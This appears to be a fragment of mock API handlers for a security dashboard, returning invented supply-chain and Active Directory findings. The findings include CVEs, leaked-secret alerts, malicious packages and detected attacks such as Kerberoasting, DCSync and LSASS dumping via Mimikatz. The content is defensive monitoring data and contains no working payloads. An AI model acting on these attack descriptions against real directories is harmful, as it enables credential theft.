  if (p === '/supply-chain/vulnerabilities') return ok({ vulns: [{ id: 1, dep_id: 1, cve_id: 'CVE-2021-44228', cvss: 10.0, epss: 0.9754, is_kev: true, fix_version: '2.17.1', has_exploit: true, severity: 'critical', description: 'Remote code execution via JNDI lookup injection in log messages — Log4Shell', affected_projects: 'legacy-service, worker, analytics', created_at: '2021-12-10T00:00:00Z' }, { id: 2, dep_id: 2, cve_id: 'CVE-2022-22965', cvss: 9.8, epss: 0.9712, is_kev: true, fix_version: '5.3.18', has_exploit: true, severity: 'critical', description: 'Spring Framework RCE via data binding — Spring4Shell', affected_projects: 'legacy-service', created_at: '2022-03-31T00:00:00Z' }, { id: 3, dep_id: 3, cve_id: 'CVE-2022-41721', cvss: 7.5, epss: 0.3201, is_kev: false, fix_version: 'v0.1.0', has_exploit: false, severity: 'high', description: 'HTTP/2 request smuggling in net/http', affected_projects: 'api-server', created_at: '2022-11-01T00:00:00Z' }, { id: 4, dep_id: 4, cve_id: 'CVE-2021-23337', cvss: 7.2, epss: 0.1842, is_kev: false, fix_version: '4.17.21', has_exploit: false, severity: 'high', description: 'Command injection via lodash template functions', affected_projects: 'frontend', created_at: '2021-04-06T00:00:00Z' }, { id: 5, dep_id: 5, cve_id: 'CVE-2018-21269', cvss: 9.8, epss: 0.8900, is_kev: false, fix_version: 'remove package', has_exploit: true, severity: 'critical', description: 'Backdoored npm package — cryptominer injected by compromised maintainer', affected_projects: 'frontend (transitive)', created_at: '2018-11-26T00:00:00Z' }], critical: 3, high: 6, kev: 2, exploited: 3 });
  if (p === '/supply-chain/sboms')           return ok([{ id: 1, repo_id: 1, artifact_name: 'api-server:2.8.1', format: 'cyclonedx', component_count: 124, license_count: 18, supplier_count: 34, has_vulnerabilities: true, generated_at: new Date(Date.now() - 3600000).toISOString(), created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, repo_id: 2, artifact_name: 'frontend:1.12.0', format: 'cyclonedx', component_count: 312, license_count: 42, supplier_count: 89, has_vulnerabilities: true, generated_at: new Date(Date.now() - 7200000).toISOString(), created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, repo_id: 3, artifact_name: 'legacy-service:4.1.2', format: 'spdx', component_count: 244, license_count: 31, supplier_count: 54, has_vulnerabilities: true, generated_at: new Date(Date.now() - 86400000).toISOString(), created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 4, repo_id: 4, artifact_name: 'mobile-app:3.1.0', format: 'cyclonedx', component_count: 89, license_count: 12, supplier_count: 22, has_vulnerabilities: false, generated_at: new Date(Date.now() - 172800000).toISOString(), created_at: new Date(Date.now() - 172800000).toISOString() }]);
  if (p === '/supply-chain/pipelines')       return ok([{ id: 1, repo_id: 1, name: 'api-server-ci', platform: 'github_actions', status: 'passing', last_run: new Date(Date.now() - 3600000).toISOString(), has_secrets: true, has_untrusted_actions: false, has_pinned_versions: true, risk_score: 42, created_at: '2022-01-15T00:00:00Z' }, { id: 2, repo_id: 2, name: 'frontend-ci', platform: 'github_actions', status: 'passing', last_run: new Date(Date.now() - 7200000).toISOString(), has_secrets: false, has_untrusted_actions: true, has_pinned_versions: false, risk_score: 61, created_at: '2022-02-01T00:00:00Z' }, { id: 3, repo_id: 3, name: 'legacy-build', platform: 'jenkins', status: 'failing', last_run: new Date(Date.now() - 14400000).toISOString(), has_secrets: true, has_untrusted_actions: true, has_pinned_versions: false, risk_score: 88, created_at: '2019-06-10T00:00:00Z' }, { id: 4, repo_id: 5, name: 'infra-pipeline', platform: 'github_actions', status: 'passing', last_run: new Date(Date.now() - 86400000).toISOString(), has_secrets: true, has_untrusted_actions: false, has_pinned_versions: true, risk_score: 54, created_at: '2022-07-01T00:00:00Z' }]);
  if (p === '/supply-chain/secrets')         return ok({ secrets: [{ id: 1, repo_id: 1, secret_type: 'aws_access_key', file_path: 'config/aws.go', commit_hash: 'a1b2c3d4', severity: 'critical', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, repo_id: 3, secret_type: 'aws_access_key', file_path: 'src/main/resources/application.properties', commit_hash: 'b2c3d4e5', severity: 'critical', status: 'open', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 3, repo_id: 5, secret_type: 'aws_access_key', file_path: 'terraform/backend.tf', commit_hash: 'c3d4e5f6', severity: 'critical', status: 'open', created_at: new Date(Date.now() - 172800000).toISOString() }, { id: 4, repo_id: 2, secret_type: 'github_token', file_path: '.github/workflows/deploy.yml', commit_hash: 'd4e5f6a7', severity: 'high', status: 'open', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 5, repo_id: 2, secret_type: 'api_key', file_path: 'src/utils/stripe.ts', commit_hash: 'e5f6a7b8', severity: 'high', status: 'resolved', created_at: new Date(Date.now() - 604800000).toISOString() }], total: 11, open: 10, aws_keys: 3, api_keys: 4 });
  if (p === '/supply-chain/code-integrity')  return ok({ signed_commits_rate: 72, signed_tags_rate: 88, protected_branches: 8, force_push_incidents: 1, unsigned_commit_repos: 3, findings: [{ repo: 'api-server', finding: 'Unsigned commits on main branch', severity: 'high', count: 14 }, { repo: 'frontend', finding: 'Force push detected on protected branch', severity: 'critical', count: 1 }, { repo: 'mobile-app', finding: 'Unsigned tags on releases', severity: 'medium', count: 3 }, { repo: 'infra-terraform', finding: 'No branch protection on default branch', severity: 'high', count: 1 }] });
  if (p === '/supply-chain/artifacts')       return ok([{ id: 1, pipeline_id: 1, name: 'api-server', artifact_type: 'container', version: '2.8.1', is_signed: true, has_sbom: true, artifact_hash: 'sha256:3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f', provenance_available: true, risk_score: 18, created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, pipeline_id: 2, name: 'frontend', artifact_type: 'container', version: '1.12.0', is_signed: true, has_sbom: true, artifact_hash: 'sha256:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b', provenance_available: true, risk_score: 22, created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, pipeline_id: 3, name: 'legacy-service', artifact_type: 'jar', version: '4.1.2', is_signed: false, has_sbom: false, artifact_hash: 'sha256:1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', provenance_available: false, risk_score: 91, created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 4, pipeline_id: 4, name: 'infra-plan', artifact_type: 'binary', version: '1.0.0', is_signed: false, has_sbom: false, artifact_hash: '', provenance_available: false, risk_score: 54, created_at: new Date(Date.now() - 86400000).toISOString() }]);
  if (p === '/supply-chain/third-party')     return ok({ packages: [{ name: 'lodash', ecosystem: 'npm', version: '4.17.15', trust_score: 82, maintenance: 'active', last_release: '2021-02-13', advisories: 1, downloads_weekly: 45000000 }, { name: 'log4j-core', ecosystem: 'maven', version: '2.14.1', trust_score: 34, maintenance: 'patched', last_release: '2021-12-28', advisories: 3, downloads_weekly: 1200000 }, { name: 'requests', ecosystem: 'pip', version: '2.28.2', trust_score: 91, maintenance: 'active', last_release: '2023-01-12', advisories: 0, downloads_weekly: 8000000 }, { name: 'colors', ecosystem: 'npm', version: '1.4.0', trust_score: 22, maintenance: 'abandoned', last_release: '2021-01-04', advisories: 1, downloads_weekly: 3500000 }, { name: 'event-stream', ecosystem: 'npm', version: '3.3.4', trust_score: 5, maintenance: 'compromised', last_release: '2018-11-26', advisories: 1, downloads_weekly: 0 }], ci_plugins: [{ name: 'actions/checkout', version: 'v4', is_pinned: true, trusted: true, sha: 'b4ffde65f46336ab88eb53be808477a3936bae11' }, { name: 'actions/setup-node', version: 'v3', is_pinned: false, trusted: true, sha: '' }, { name: 'third-party/deploy-action', version: 'latest', is_pinned: false, trusted: false, sha: '' }] });
  if (p === '/supply-chain/provenance')      return ok({ slsa_level: 1, provenance_rate: 61, builds: [{ artifact: 'api-server:2.8.1', builder: 'github-actions', build_time: new Date(Date.now() - 3600000).toISOString(), source_commit: 'a1b2c3d4', artifact_hash: 'sha256:3e4f5a6b...', signed: true, slsa_level: 2, attestation: 'cosign' }, { artifact: 'frontend:1.12.0', builder: 'github-actions', build_time: new Date(Date.now() - 7200000).toISOString(), source_commit: 'b2c3d4e5', artifact_hash: 'sha256:7a8b9c0d...', signed: true, slsa_level: 2, attestation: 'cosign' }, { artifact: 'legacy-service:4.1.2', builder: 'jenkins', build_time: new Date(Date.now() - 14400000).toISOString(), source_commit: 'c3d4e5f6', artifact_hash: 'sha256:1c2d3e4f...', signed: false, slsa_level: 0, attestation: '' }, { artifact: 'infra-plan:1.0.0', builder: 'github-actions', build_time: new Date(Date.now() - 86400000).toISOString(), source_commit: 'd4e5f6a7', artifact_hash: '', signed: false, slsa_level: 0, attestation: '' }] });
  if (p === '/supply-chain/threat-intel')    return ok({ malicious_packages: [{ name: 'event-stream', ecosystem: 'npm', version: '3.3.6', threat: 'cryptominer injected by compromised maintainer account', discovered: '2018-11-26', downloads: 8000000 }, { name: 'ctx', ecosystem: 'pip', version: '0.1.2', threat: 'Dependency confusion attack — steals env vars and AWS credentials', discovered: '2022-05-21', downloads: 22000 }, { name: 'node-ipc', ecosystem: 'npm', version: '10.1.1', threat: 'Political protest payload — destructive code targeting Russian/Belarusian IPs', discovered: '2022-03-15', downloads: 1000000 }], campaigns: [{ name: 'Dependency Confusion Wave', first_seen: '2026-07-01', packages_affected: 12, ecosystems: 'npm,pip,nuget', actor: 'Unknown' }, { name: 'Typosquatting Campaign', first_seen: '2026-06-15', packages_affected: 34, ecosystems: 'npm', actor: 'Unknown' }], ioc_matches: [{ type: 'package', value: 'event-stream@3.3.6', hits: 2, category: 'compromised_package' }, { type: 'domain', value: 'npm-malware-c2.xyz', hits: 1, category: 'c2_callback' }], exploited_cves: [{ cve: 'CVE-2021-44228', package: 'log4j-core', cvss: 10.0, kev: true, exploits_in_wild: true }, { cve: 'CVE-2022-22965', package: 'spring-webmvc', cvss: 9.8, kev: true, exploits_in_wild: true }] });
  if (p === '/supply-chain/timeline')        return ok([{ id: 1, event_type: 'secret_found', target: 'config/aws.go', severity: 'critical', detail: 'aws_access_key found in config/aws.go', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, event_type: 'vuln_detected', target: 'log4j-core:2.14.1', severity: 'critical', detail: 'CVE-2021-44228 (Log4Shell) detected in legacy-service', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, event_type: 'build_failure', target: 'legacy-build', severity: 'high', detail: 'Build pipeline failed due to dependency conflict', created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 4, event_type: 'malicious_pkg', target: 'event-stream@3.3.4', severity: 'critical', detail: 'Compromised npm package detected as transitive dependency in frontend', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 5, event_type: 'unsigned_commit', target: 'api-server/main', severity: 'medium', detail: '14 unsigned commits pushed to main branch', created_at: new Date(Date.now() - 172800000).toISOString() }]);
  if (p === '/supply-chain/analytics')       return ok({ compliance_trend: Array.from({length: 14}, (_, i) => ({ date: new Date(Date.now() - (13-i)*86400000).toISOString().slice(0,10), count: 3 + i })), most_vulnerable_projects: [{ name: 'legacy-service', cve_count: 22, critical: 6, risk: 94 }, { name: 'api-server', cve_count: 14, critical: 3, risk: 87 }, { name: 'worker', cve_count: 8, critical: 1, risk: 71 }], most_used_dependencies: [{ package: 'lodash', ecosystem: 'npm', used_by: 8, has_vuln: false }, { package: 'requests', ecosystem: 'pip', used_by: 5, has_vuln: false }, { package: 'log4j-core', ecosystem: 'maven', used_by: 3, has_vuln: true }, { package: 'spring-webmvc', ecosystem: 'maven', used_by: 2, has_vuln: true }], secret_findings_by_type: [{ type: 'aws_access_key', count: 3 }, { type: 'api_key', count: 4 }, { type: 'github_token', count: 2 }, { type: 'ssh_private_key', count: 1 }], build_failures: [{ pipeline: 'legacy-build', failures: 7, last_failure: new Date(Date.now() - 3600000).toISOString() }, { pipeline: 'frontend-ci', failures: 2, last_failure: new Date(Date.now() - 86400000).toISOString() }] });
  if (p === '/supply-chain/compliance')      return ok({ overall_score: 64, frameworks: [{ name: 'NIST SSDF', score: 68, passed: 41, failed: 19, total: 60, version: '1.1' }, { name: 'SLSA', score: 42, level: 1, target_level: 3, passed: 8, failed: 11, total: 19 }, { name: 'CIS Software Supply Chain', score: 71, passed: 29, failed: 12, total: 41 }, { name: 'ISO 27001', score: 74, passed: 36, failed: 13, total: 49, version: '2022' }, { name: 'SOC 2', score: 69, passed: 22, failed: 10, total: 32 }, { name: 'PCI DSS', score: 77, passed: 24, failed: 7, total: 31, version: '4.0' }], failed_controls: [{ control: 'SLSA-L2', title: 'Build must be automatically initiated by source control', severity: 'high', framework: 'SLSA' }, { control: 'CIS-3.4', title: 'Ensure all build artifacts are signed', severity: 'critical', framework: 'CIS' }, { control: 'SOC2-CC8.1', title: 'Changes to production must be reviewed and approved', severity: 'high', framework: 'SOC 2' }] });
  if (p === '/supply-chain/policies')        return ok([{ id: 1, name: 'Block Critical CVEs in Production', rule_type: 'vulnerability', action: 'block', is_enabled: true, description: 'Block any build deploying a dependency with CVSS ≥ 9.0', created_at: '2026-01-01T00:00:00Z' }, { id: 2, name: 'Require SBOM on Release', rule_type: 'sbom', action: 'block', is_enabled: true, description: 'All release artifacts must include a CycloneDX or SPDX SBOM', created_at: '2026-01-01T00:00:00Z' }, { id: 3, name: 'Deny Unpinned CI Actions', rule_type: 'pipeline', action: 'warn', is_enabled: true, description: 'Warn when GitHub Actions are not pinned to a specific SHA', created_at: '2026-02-15T00:00:00Z' }, { id: 4, name: 'Secret Detection Gate', rule_type: 'secret', action: 'block', is_enabled: true, description: 'Block any commit containing AWS keys, API tokens or private keys', created_at: '2026-03-01T00:00:00Z' }, { id: 5, name: 'Enforce Artifact Signing', rule_type: 'signing', action: 'block', is_enabled: false, description: 'Block unsigned container images from being pushed to registry (disabled — implementing cosign)', created_at: '2026-04-10T00:00:00Z' }]);

  // ── AD Security Enterprise ────────────────────────────────────────────────
  if (p === '/ad/dashboard') return ok({ forests: 1, domains: 2, domain_controllers: 3, domain_trusts: 1, high_risk_users: 14, privileged_accounts: 12, active_attacks: 8, ad_risk_score: 74, identity_exposure: 58, failed_logins_24h: 247 });
  if (p === '/ad/inventory') return ok({ forests: 1, domains: 2, domain_controllers: 3, users: 1247, service_accounts: 28, admin_accounts: 12, computers: 184, gpos: 23, groups: 341, domain_list: [{ id: 1, name: 'corp.local', netbios: 'CORP', functional_level: 'Windows Server 2019', dc_count: 2, user_count: 1098, group_count: 298, computer_count: 162, gpo_count: 19, trust_count: 1, risk_score: 76, created_at: '2018-04-01T00:00:00Z' }, { id: 2, name: 'dev.corp.local', netbios: 'DEV', functional_level: 'Windows Server 2016', dc_count: 1, user_count: 149, group_count: 43, computer_count: 22, gpo_count: 4, trust_count: 1, risk_score: 58, created_at: '2020-08-15T00:00:00Z' }] });
  if (p === '/ad/identity-risk') return ok({ users: [{ id: 1, sam_account: 'svc_backup', display_name: 'Backup Service Account', email: 'svc_backup@corp.local', department: 'IT', is_admin: true, is_service_account: true, is_enabled: true, password_never_expires: true, last_logon: new Date(Date.now() - 300000).toISOString(), last_password_change: new Date(Date.now() - 73209600000).toISOString(), risk_score: 97, created_at: '2018-05-12T00:00:00Z' }, { id: 2, sam_account: 'jsmith', display_name: 'John Smith', email: 'jsmith@corp.local', department: 'IT', is_admin: true, is_service_account: false, is_enabled: true, password_never_expires: false, last_logon: new Date(Date.now() - 3600000).toISOString(), last_password_change: new Date(Date.now() - 7776000000).toISOString(), risk_score: 82, created_at: '2019-03-01T00:00:00Z' }, { id: 3, sam_account: 'hcraig', display_name: 'Helen Craig', email: 'hcraig@corp.local', department: 'Finance', is_admin: false, is_service_account: false, is_enabled: true, password_never_expires: true, last_logon: new Date(Date.now() - 86400000).toISOString(), last_password_change: new Date(Date.now() - 31536000000).toISOString(), risk_score: 78, created_at: '2020-01-15T00:00:00Z' }, { id: 4, sam_account: 'temp-admin', display_name: 'Temporary Admin', email: 'temp-admin@corp.local', department: 'IT', is_admin: true, is_service_account: false, is_enabled: true, password_never_expires: true, last_logon: new Date(Date.now() - 5184000000).toISOString(), last_password_change: new Date(Date.now() - 15552000000).toISOString(), risk_score: 71, created_at: '2021-06-01T00:00:00Z' }, { id: 5, sam_account: 'bob', display_name: 'Bob Wilson', email: 'bob@corp.local', department: 'Engineering', is_admin: true, is_service_account: false, is_enabled: false, password_never_expires: false, last_logon: new Date(Date.now() - 15552000000).toISOString(), last_password_change: new Date(Date.now() - 47088000000).toISOString(), risk_score: 64, created_at: '2019-11-01T00:00:00Z' }], high_risk: 14, dormant: 23, password_never_expires: 47, admin_accounts: 12, service_accounts: 28 });
  if (p === '/ad/auth-monitor') return ok({ failed_logins: 247, password_spray: 2, brute_force: 1, suspicious_logons: 8, events: [{ id: 1, event_type: 'failed_login', severity: 'high', source_user: 'administrator', source_computer: 'UNKNOWN', source_ip: '192.168.100.47', target: 'DC01.corp.local', auth_type: 'NTLM', description: '47 consecutive failed login attempts for administrator account from external IP', status: 'open', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, event_type: 'password_spray', severity: 'critical', source_user: 'multiple (94 accounts)', source_computer: 'WS-INFECTED01', source_ip: '10.0.1.88', target: 'DC01.corp.local', auth_type: 'Kerberos', description: 'Password spray detected — single password attempted against 94 accounts in 3 minutes', status: 'open', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, event_type: 'suspicious_logon', severity: 'high', source_user: 'jsmith', source_computer: 'WS-CHICAGO01', source_ip: '10.50.1.22', target: 'FILE-SRV01', auth_type: 'NTLM', description: 'Impossible travel — jsmith logged in from Chicago and NYC within 4 minutes', status: 'open', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 4, event_type: 'kerberos_ticket', severity: 'critical', source_user: 'svc_backup', source_computer: 'WS-ADMIN01', source_ip: '10.0.1.45', target: 'Multiple SPNs', auth_type: 'Kerberos', description: '23 TGS tickets requested for RC4 encrypted SPNs in 4 minutes — Kerberoasting pattern', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 5, event_type: 'ldap_recon', severity: 'medium', source_user: 'hcraig', source_computer: 'LAPTOP-HCRAIG', source_ip: '10.0.3.89', target: 'DC01.corp.local', auth_type: 'LDAP', description: 'Unusual LDAP enumeration — 847 LDAP queries in 2 minutes (BloodHound-like pattern)', status: 'investigating', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 6, event_type: 'ntlm_relay', severity: 'high', source_user: 'ANONYMOUS', source_computer: 'ROGUE-DEVICE', source_ip: '10.0.99.1', target: 'FILE-SRV01', auth_type: 'NTLM', description: 'NTLM relay attempt detected — Responder/Inveigh-like tool intercepting NTLMv2 hashes', status: 'open', created_at: new Date(Date.now() - 14400000).toISOString() }] });
  if (p === '/ad/attacks') { const cat = sp.get('category'); const allAttacks = [{ id: 1, attack_type: 'kerberoasting', severity: 'critical', source_user: 'svc_backup', source_computer: 'WS-ADMIN01', source_ip: '10.0.1.45', target: 'Multiple SPNs', technique: 'RC4 TGS Ticket Extraction', description: '23 TGS tickets requested for RC4-encrypted SPNs — automated Kerberoasting via Rubeus', mitre_technique: 'T1558.003', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, attack_type: 'dcsync', severity: 'critical', source_user: 'hcraig', source_computer: 'WS-INFECTED01', source_ip: '10.0.1.88', target: 'DC01.corp.local', technique: 'MS-DRSR Replication', description: 'DCSync via Mimikatz — replication request for all password hashes from non-DC workstation', mitre_technique: 'T1003.006', status: 'open', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, attack_type: 'pass_the_hash', severity: 'critical', source_user: 'administrator', source_computer: 'WS-INFECTED01', source_ip: '10.0.1.88', target: 'FILE-SRV01, PRINT-SRV01, DC01', technique: 'NTLM Hash Reuse', description: 'Pass-the-Hash via stolen NTLM hash — lateral movement to 3 servers in 8 minutes', mitre_technique: 'T1550.002', status: 'open', created_at: new Date(Date.now() - 10800000).toISOString() }, { id: 4, attack_type: 'golden_ticket', severity: 'critical', source_user: 'administrator (forged)', source_computer: 'ROGUE-HOST', source_ip: '192.168.100.47', target: 'corp.local', technique: 'KRBTGT Hash Forgery', description: 'Golden Ticket detected — forged TGT with 10-year lifetime using krbtgt hash', mitre_technique: 'T1558.001', status: 'open', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 5, attack_type: 'as_rep_roasting', severity: 'high', source_user: 'ANONYMOUS', source_computer: 'WS-UNKNOWN', source_ip: '10.0.5.77', target: 'bob, temp-user, svc_legacy', technique: 'AS-REP Hash Extraction', description: 'AS-REP Roasting — 3 accounts without Kerberos pre-auth requested, hashes extracted', mitre_technique: 'T1558.004', status: 'open', created_at: new Date(Date.now() - 18000000).toISOString() }, { id: 6, attack_type: 'lsass_access', severity: 'critical', source_user: 'SYSTEM', source_computer: 'WS-INFECTED01', source_ip: '10.0.1.88', target: 'lsass.exe', technique: 'LSASS Memory Dump', description: 'LSASS process accessed via OpenProcess — credential dumping (Mimikatz sekurlsa::logonpasswords)', mitre_technique: 'T1003.001', status: 'open', created_at: new Date(Date.now() - 9000000).toISOString() }, { id: 7, attack_type: 'domain_admin_creation', severity: 'critical', source_user: 'jsmith', source_computer: 'WS-ADMIN01', source_ip: '10.0.1.45', target: 'backdoor-admin', technique: 'Privileged Account Creation', description: 'New Domain Admin account "backdoor-admin" created outside change window', mitre_technique: 'T1136.002', status: 'open', created_at: new Date(Date.now() - 21600000).toISOString() }, { id: 8, attack_type: 'lateral_psexec', severity: 'high', source_user: 'administrator', source_computer: 'WS-INFECTED01', source_ip: '10.0.1.88', target: 'FILE-SRV01', technique: 'PsExec Remote Execution', description: 'PsExec lateral movement — ADMIN$ share + service creation pattern detected', mitre_technique: 'T1021.002', status: 'investigating', created_at: new Date(Date.now() - 12000000).toISOString() }]; const kerberosTypes = ['kerberoasting','as_rep_roasting','golden_ticket','silver_ticket','pass_the_ticket','kerberos_delegation']; const credTypes = ['pass_the_hash','credential_dumping','lsass_access','dcsync','dcshadow','skeleton_key','sam_access']; const privTypes = ['admin_group_change','domain_admin_creation','sid_history_abuse','privilege_escalation']; const lateralTypes = ['psexec','lateral_smb','lateral_rdp','lateral_winrm','lateral_wmi','lateral_dcom','lateral_psexec']; let filtered = allAttacks; if (cat === 'kerberos') filtered = allAttacks.filter(a => kerberosTypes.includes(a.attack_type)); else if (cat === 'credential') filtered = allAttacks.filter(a => credTypes.includes(a.attack_type)); else if (cat === 'privilege') filtered = allAttacks.filter(a => privTypes.includes(a.attack_type)); else if (cat === 'lateral') filtered = allAttacks.filter(a => lateralTypes.includes(a.attack_type)); return ok({ attacks: filtered, kerberoasting: 1, as_rep_roasting: 1, golden_ticket: 1, pass_the_hash: 1, dcsync: 1, dcshadow: 0, lateral_movement: 1, priv_escalation: 1 }); }
  if (p === '/ad/gpo-changes') return ok([{ id: 1, name: 'Default Domain Policy', status: 'modified', linked_ous: 'corp.local', last_modified: new Date(Date.now() - 86400000).toISOString(), created_at: '2018-04-01T00:00:00Z' }, { id: 2, name: 'Workstation Security Baseline', status: 'modified', linked_ous: 'Workstations OU', last_modified: new Date(Date.now() - 172800000).toISOString(), created_at: '2020-01-15T00:00:00Z' }, { id: 3, name: 'Disable-Malicious-Scripts', status: 'created', linked_ous: 'Domain Controllers OU', last_modified: new Date(Date.now() - 7200000).toISOString(), created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 4, name: 'Legacy-NTLM-Allow', status: 'enabled', linked_ous: 'corp.local', last_modified: new Date(Date.now() - 604800000).toISOString(), created_at: '2019-03-01T00:00:00Z' }]);
  if (p === '/ad/changes') return ok([{ id: 1, event_type: 'domain_admin_creation', severity: 'critical', source_user: 'jsmith', source_computer: 'WS-ADMIN01', target: 'backdoor-admin', description: 'New Domain Admin account "backdoor-admin" added to Domain Admins group', status: 'open', created_at: new Date(Date.now() - 21600000).toISOString() }, { id: 2, event_type: 'group_membership_changed', severity: 'critical', source_user: 'jsmith', source_computer: 'WS-ADMIN01', target: 'Domain Admins', description: 'svc_backup added to Domain Admins group — previously only in Backup Operators', status: 'open', created_at: new Date(Date.now() - 43200000).toISOString() }, { id: 3, event_type: 'user_created', severity: 'high', source_user: 'administrator', source_computer: 'DC01', target: 'temp-exec-user', description: 'New user account created outside business hours (03:47 AM)', status: 'open', created_at: new Date(Date.now() - 57600000).toISOString() }, { id: 4, event_type: 'trust_changed', severity: 'high', source_user: 'administrator', source_computer: 'DC01', target: 'dev.corp.local', description: 'Forest trust modified — SID filtering disabled on dev.corp.local trust', status: 'open', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 5, event_type: 'group_membership_changed', severity: 'medium', source_user: 'helpdesk-admin', source_computer: 'HELPDESK01', target: 'Remote Desktop Users', description: 'hcraig added to Remote Desktop Users on 3 servers', status: 'investigating', created_at: new Date(Date.now() - 172800000).toISOString() }]);
  if (p === '/ad/attack-paths') return ok({ nodes: [{ id: 'user-svc', label: 'svc_backup', type: 'service_account', risk: 97, detail: 'Kerberoastable SPN · Domain Admin' }, { id: 'kerberoast', label: 'Kerberoast', type: 'technique', risk: 100, detail: 'T1558.003 · RC4 encryption' }, { id: 'user-hcraig', label: 'hcraig', type: 'user', risk: 78, detail: 'Finance · password never expires' }, { id: 'group-da', label: 'Domain Admins', type: 'group', risk: 100, detail: '12 members' }, { id: 'dc-prod', label: 'DC01.corp.local', type: 'domain_controller', risk: 100, detail: 'PDC Emulator · FSMO' }, { id: 'gpo-default', label: 'Default Domain Policy', type: 'gpo', risk: 80, detail: 'Weak password policy' }], edges: [{ source: 'user-svc', target: 'kerberoast', label: 'vulnerable to', risk: 'critical' }, { source: 'kerberoast', target: 'user-hcraig', label: 'ticket cracked → pivot', risk: 'critical' }, { source: 'user-hcraig', target: 'group-da', label: 'member of', risk: 'critical' }, { source: 'group-da', target: 'dc-prod', label: 'controls', risk: 'critical' }, { source: 'gpo-default', target: 'dc-prod', label: 'linked to', risk: 'high' }] });
  if (p === '/ad/tiering') return ok({ tier0_assets: [{ name: 'Domain Controllers', count: 3, type: 'dc' }, { name: 'AD Admin Workstations', count: 2, type: 'paw' }, { name: 'Tier-0 Groups', count: 3, type: 'group' }], tier1_assets: [{ name: 'Server Admins', count: 12, type: 'admin_user' }, { name: 'Member Servers', count: 8, type: 'server' }], tier2_assets: [{ name: 'Workstations', count: 184, type: 'workstation' }, { name: 'Standard Users', count: 1235, type: 'user' }], privileged_sessions: [{ user: 'administrator', computer: 'WS-ADMIN01', start: new Date(Date.now() - 7200000).toISOString(), duration: 120 }, { user: 'jsmith', computer: 'DC01', start: new Date(Date.now() - 1800000).toISOString(), duration: 30 }] });
  if (p === '/ad/exposure') return ok({ unconstrained_delegation: 3, findings: [{ type: 'unconstrained_delegation', severity: 'critical', count: 3, description: 'Computers with unconstrained Kerberos delegation — any authenticated user TGT is cached and extractable', affected: ['FILE01', 'PRINT01', 'WEB-SRV01'] }, { type: 'constrained_delegation_abuse', severity: 'high', count: 1, description: 'Service accounts with S4U2Self/S4U2Proxy delegation misconfiguration', affected: ['svc_app_pool'] }, { type: 'rbcd', severity: 'high', count: 0, description: 'Resource-Based Constrained Delegation paths that allow lateral movement', affected: [] }, { type: 'weak_acls', severity: 'high', count: 4, description: 'ACLs granting WriteDACL / GenericAll / GenericWrite to non-admin principals', affected: ['svc_backup → Domain Admins', 'jsmith → Domain Admins OU', 'helpdesk → Reset Password on Admins'] }, { type: 'excessive_privileges', severity: 'high', count: 3, description: 'Regular users in privileged groups without business justification', affected: ['bob@corp.local in Domain Admins', 'temp-admin in Enterprise Admins', 'svc_backup in Domain Admins'] }, { type: 'anonymous_ldap', severity: 'medium', count: 1, description: 'LDAP allows anonymous binds — unauthenticated enumeration possible', affected: ['DC01.corp.local'] }, { type: 'legacy_protocols', severity: 'medium', count: 3, description: 'NTLMv1, LM hashes, and WDigest authentication enabled on DCs', affected: ['NTLM v1 enabled', 'WDigest plaintext caching', 'LM hashes enabled'] }] });
  if (p === '/ad/threat-intel') return ok({ threat_actors: [{ actor: 'Lazarus Group', campaigns: 2, target: 'Financial institutions', ttps: 'T1558.003,T1550.002,T1059.001', active: true }, { actor: 'APT29 (Cozy Bear)', campaigns: 1, target: 'Government / Defense', ttps: 'T1558.001,T1003.001,T1484', active: true }, { actor: 'FIN7', campaigns: 1, target: 'Retail / Finance', ttps: 'T1078,T1550.002,T1021.002', active: false }], malware: [{ family: 'Mimikatz', detections: 2, category: 'credential_theft', cve: 'N/A' }, { family: 'Impacket', detections: 1, category: 'lateral_movement', cve: 'N/A' }, { family: 'Rubeus', detections: 3, category: 'kerberos_attacks', cve: 'N/A' }, { family: 'BloodHound', detections: 0, category: 'recon', cve: 'N/A' }], ioc_matches: [{ type: 'ip', value: '192.168.100.47', hits: 8, category: 'c2_server', threat_actor: 'APT29' }, { type: 'hash', value: 'fc3e4b4e6c1a7b5d2f9e0a3b6c8d1e2f', hits: 3, category: 'mimikatz_variant', threat_actor: 'Unknown' }, { type: 'user', value: 'svc_backup', hits: 12, category: 'compromised_account', threat_actor: 'Lazarus' }], credential_campaigns: [{ campaign: 'Kerberoasting Wave', first_seen: '2026-07-10', last_seen: '2026-07-16', accounts_targeted: 7, tickets_requested: 23 }, { campaign: 'DCSync Attempt', first_seen: '2026-07-14', last_seen: '2026-07-14', accounts_targeted: 1, tickets_requested: 0 }] });
